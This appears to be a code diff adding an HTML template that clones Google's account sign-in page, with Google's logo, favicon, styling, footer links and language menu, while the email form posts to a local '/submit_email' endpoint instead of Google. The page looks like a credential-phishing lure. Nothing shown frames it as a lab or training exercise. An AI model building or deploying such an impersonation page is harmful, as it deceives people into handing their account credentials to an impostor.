@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico">
+    <style>
+        body { 
+            font-family: 'Google Sans', Roboto, Arial, sans-serif; 
+            background-color: #ffffff; 
+            display: flex; 
+            flex-direction: column;
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            color: #202124; 
+        }
+        .card-container { 
+            border: none; 
+            background-color: #ffffff; 
+            border-radius: 8px; 
+            padding: 48px 40px 36px; 
+            width: 100%; 
+            max-width: 448px; 
+            box-sizing: border-box; 
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .content { 
+            text-align: left; 
+            margin-top: -100px; 
+        } 
+        .logo { 
+            width: 40px; 
+            height: 40px; 
+            margin: 0 0 40px 0; 
+            display: block; 
+        } 
+        h1 { 
+            font-size: 32px; 
+            font-weight: 400; 
+            margin: 0 0 8px 0; 
+            color: #202124; 
+        } 
+        p { 
+            font-size: 16px; 
+            margin: 0 0 40px 0; 
+            letter-spacing: 0.1px; 
+            line-height: 1.5; 
+            color: #5f6368; 
+        }
+
+        .input-group { position: relative; margin-top: 24px; text-align: left; }
+        .input-field { 
+            width: 100%; 
+            padding: 14px 15px 14px; 
+            border: 1px solid #dadce0; 
+            border-radius: 4px; 
+            box-sizing: border-box; 
+            font-size: 16px; 
+            background-color: #ffffff; 
+            color: #202124; 
+            text-align: left; 
+        }
+        .input-field:focus { 
+            outline: none; 
+            border: 2px solid #1a73e8; 
+            padding: 13px 14px 13px; 
+            background-color: #ffffff; 
+        }
+        .input-label { 
+            position: absolute; 
+            left: 16px; 
+            top: 50%; 
+            transform: translateY(-50%);
+            color: #5f6368; 
+            pointer-events: none; 
+            transition: all 0.2s ease-out; 
+            background-color: transparent; 
+        }
+        .input-field:focus + .input-label, .input-field:not(:placeholder-shown) + .input-label { 
+            top: -8px; 
+            left: 12px; 
+            font-size: 12px; 
+            color: #1a73e8; 
+            background-color: #ffffff; 
+            padding: 0 4px; 
+            transform: translateY(0); 
+        }
+        
+        .link { 
+            color: #1a73e8; 
+            font-weight: 500; 
+            text-decoration: none; 
+            font-size: 14px; 
+            display: inline-block;
+        }
+        .guest-mode { 
+            text-align: left; 
+            font-size: 14px; 
+            color: #5f6368; 
+            margin-top: 32px; 
+        }
+        .actions { 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            margin-top: 48px; 
+        }
+        .create-account-link { 
+            font-weight: 500; 
+            text-decoration: none; 
+            color: #1a73e8; 
+            background: transparent; 
+            border: none; 
+            cursor: pointer; 
+            padding: 8px 0; 
+            font-size: 16px; 
+        }
+        .next-button { 
+            background-color: #1a73e8; 
+            color: #ffffff; 
+            border: none; 
+            border-radius: 20px; 
+            padding: 10px 24px; 
+            cursor: pointer; 
+            font-size: 16px; 
+            font-weight: 500;
+            min-width: 90px;
+        }
+        
+        .error-message { 
+            color: #d93025; 
+            font-size: 12px; 
+            text-align: left; 
+            margin-top: 4px; 
+            display: flex; 
+            align-items: center; 
+        }
+        .error-icon { 
+            width: 16px; 
+            height: 16px; 
+            margin-right: 8px; 
+        }
+        .error-icon path { fill: #d93025; }
+        .input-field.error { 
+            border-color: #d93025; 
+        }
+        .input-field.error:focus { 
+            border: 2px solid #d93025; 
+            padding: 17px 14px 5px; 
+        }
+        .input-field.error:focus + .input-label { 
+            color: #d93025; 
+        }
+
+        .footer {
+            margin-top: auto;
+            width: 100%;
+            max-width: 528px;
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            font-size: 12px; 
+            color: #5f6368;
+            padding: 0 40px 10px 40px; 
+            box-sizing: border-box;
+        }
+        .footer a {
+            color: #5f6368; 
+            text-decoration: none;
+        }
+        .footer-lang svg {
+            fill: #5f6368;
+        }
+
+        @media (max-width: 480px) {
+            body { align-items: flex-start; background-color: #ffffff; } 
+            .card-container {
+                border: none; 
+                box-shadow: none; 
+                padding: 24px; 
+                margin-top: 0;
+            }
+            .content { margin-top: 0; }
+            .footer {
+                padding: 0 24px 10px 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="card-container">
+        <div class="content">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/40px-Google_%22G%22_logo.svg.png" alt="Google G Logo" class="logo">
+            <h1>Sign in</h1>
+            <p>with your Google Account</p>
+            <form action="/submit_email" method="POST">
+                <div class="input-group">
+                    <input type="text" name="username" id="username" class="input-field {% if error %}error{% endif %}" placeholder=" " required>
+                    <label for="username" class="input-label">Email or phone</label>
+                </div>
+                {% if error %}
+                    <div class="error-message" id="error-div">
+                        <svg class="error-icon" aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
+                        <span>{{ error }}</span>
+                    </div>
+                {% endif %}
+                <div style="text-align: left; margin-top: 8px;">
+                    <a href="#" class="link">Forgot email?</a>
+                </div>
+                <div class="guest-mode">
+                    Not your computer? Use Guest mode to sign in privately.<br>
+                    <a href="#" class="link">Learn more</a>
+                </div>
+                <div class="actions">
+                    <a href="#" class="create-account-link">Create account</a>
+                    <button type="submit" class="next-button">Next</button>
+                </div>
+            </form>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="footer-lang" style="display: flex; align-items: center;">
+            <select style="
+                background-color: transparent; 
+                color: #5f6368; 
+                border: none; 
+                font-size: 12px;
+                padding-right: 20px;
+                -webkit-appearance: none;
+                -moz-appearance: none;
+                appearance: none;
+                cursor: pointer;
+            ">
+                <option value="en" selected>English (United States)</option>
+                <option value="ar">العربية (Arabic)</option>
+                <option value="es">Español (Spanish)</option>
+                <option value="fr">Français (French)</option>
+                <option value="de">Deutsch (German)</option>
+                <option value="ja">日本語 (Japanese)</option>
+                <option value="zh">中文 (Chinese)</option>
+            </select>
+            <svg aria-hidden="true" width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="margin-left: -16px; pointer-events: none;"><path d="M7 10l5 5 5-5z"></path></svg>
+        </div>
+        <div style="display: flex; gap: 24px;">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+    <script>
+        const emailInput = document.getElementById('username');
+        const errorDiv = document.getElementById('error-div');
+        if (emailInput && errorDiv) {
+            emailInput.addEventListener('input', function() {
+                errorDiv.style.display = 'none';
+                emailInput.classList.remove('error');
+            });
+        }
+    </script>
+</body>
+</html>
